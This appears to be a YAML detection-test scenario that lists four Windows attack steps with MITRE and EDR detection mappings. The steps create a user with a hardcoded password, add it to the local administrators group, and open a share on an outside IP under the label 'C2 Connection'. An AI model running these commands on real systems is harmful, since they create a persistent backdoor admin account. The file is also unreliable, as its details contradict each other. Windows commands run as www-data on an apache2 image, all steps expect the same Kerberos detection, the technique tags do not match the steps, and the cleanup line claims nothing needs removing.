  validated against dataset=xdr_data.

  '
moat_tier: LEAD
cgo_anchor:
  image_name: apache2
  primary_username: www-data
external_tools:
- name: Atomic Red Team
  source: https://github.com/redcanaryco/atomic-red-team
  type: script
  install_inline: false
  adapter_ref: TOOL-ATOMIC-RED-TEAM
steps:
- id: step-01
  name: Set Kerberos Ticket Path
  command: cmd /c "set KERBEROS_TGT=\"C:\\temp\\ticket.kirbi\" && exit"
  identity: www-data
  mitre_technique: T1558.003
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Weakly-Encrypted Kerberos TGT Process
    ttp_ref: TTP-2026-0487
    detection_id: bioc-weakly-encrypted-kerberos-tgt-process
- id: step-02
  name: Create Test User
  command: cmd /c "net user /add testuser P@ssw0rd123 && exit"
  identity: www-data
  mitre_technique: T1078
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Weakly-Encrypted Kerberos TGT Process
    ttp_ref: TTP-2026-0487
    detection_id: bioc-weakly-encrypted-kerberos-tgt-process
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Add User to Admin Group
  command: cmd /c "net localgroup administrators testuser /add && exit"
  identity: www-data
  mitre_technique: T1078
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Weakly-Encrypted Kerberos TGT Process
    ttp_ref: TTP-2026-0487
    detection_id: bioc-weakly-encrypted-kerberos-tgt-process
  causality:
    parent_step: step-02
    pivot: process_lineage
- id: step-04
  name: Establish C2 Connection
  command: cmd /c "net use \\192.0.2.100\testshare /user:testuser P@ssw0rd123 && exit"
  identity: www-data
  mitre_technique: T1566
  expected_detections:
  - plane: EDR
    type: ABIOC
    description: Weakly-Encrypted Kerberos TGT Response
    ttp_ref: TTP-2026-0487
    detection_id: abioc-weakly-encrypted-kerberos-tgt-response
  causality:
    parent_step: step-03
    pivot: process_lineage
cleanup:
  commands:
  - echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'
